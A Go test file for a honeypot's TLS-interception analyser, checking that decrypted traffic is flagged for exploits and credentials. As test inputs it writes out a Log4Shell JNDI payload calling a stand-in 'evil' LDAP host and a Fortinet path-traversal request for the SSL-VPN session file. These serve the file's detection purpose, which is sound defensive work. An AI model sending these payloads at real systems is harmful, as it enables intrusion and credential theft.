package handler

import (
	"strings"
	"testing"

	"github.com/rom/tarpit-honeypot/internal/config"
)

// TestAnalyzeDecryptedExploit: an exploit hidden inside the TLS tunnel must be
// attributed from the decrypted client->backend bytes (forward mode has no
// inner handler, so it assumes an HTTP-shaped service).
func TestAnalyzeDecryptedExploit(t *testing.T) {
	h := &tlsIntercept{} // ForwardTo set, InnerHandler empty
	var res Result
	req := "GET /?x=${jndi:ldap://evil/a} HTTP/1.1\r\nHost: x\r\n\r\n"
	h.analyzeDecrypted(&res, []byte(req))

	found := false
	for _, id := range res.CVEHits {
		if id == "CVE-2021-44228" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected Log4Shell in CVEHits; got %v", res.CVEHits)
	}
	if !hasAnom(res, "tls-decrypted-exploit") {
		t.Errorf("expected tls-decrypted-exploit anomaly; meta=%v", res.Meta)
	}
}

// TestAnalyzeDecryptedCredentials: a Basic-Auth header in the decrypted stream
// is flagged.
func TestAnalyzeDecryptedCredentials(t *testing.T) {
	h := &tlsIntercept{}
	var res Result
	req := "GET /admin HTTP/1.1\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n\r\n"
	h.analyzeDecrypted(&res, []byte(strings.ToLower(req)))
	if !hasAnom(res, "tls-decrypted-credentials") {
		t.Errorf("expected tls-decrypted-credentials; meta=%v", res.Meta)
	}
}

// TestAnalyzeDecryptedInnerHandlerService: with an inner handler set, CVE
// matching is scoped to that service.
func TestAnalyzeDecryptedInnerHandlerService(t *testing.T) {
	h := &tlsIntercept{tic: config.TLSIntercept{InnerHandler: "fortinet"}}
	var res Result
	req := "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1\r\n\r\n"
	h.analyzeDecrypted(&res, []byte(req))
	if len(res.CVEHits) == 0 {
		t.Errorf("expected a fortinet CVE on the decrypted stream; got none")
	}
}
